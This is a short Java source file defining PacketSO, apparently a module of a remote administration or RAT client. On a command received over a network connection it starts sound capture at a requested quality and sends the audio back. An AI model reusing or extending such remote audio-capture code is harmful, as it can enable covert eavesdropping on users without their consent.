package com.redpois0n.packets;

import com.redpois0n.Connection;
import com.redpois0n.Sound;

public class PacketSO extends Packet {

	@Override
	public void read(String line) throws Exception {
		if (Connection.readLine().equalsIgnoreCase("true")) {
			int quality = Integer.parseInt(Connection.readLine());
			Connection.write(Header.SOUND);
			Sound.initialize(quality);
			Sound.write();
		} else {
			Connection.write(Header.SOUND);
			Sound.write();
		}
	}

}
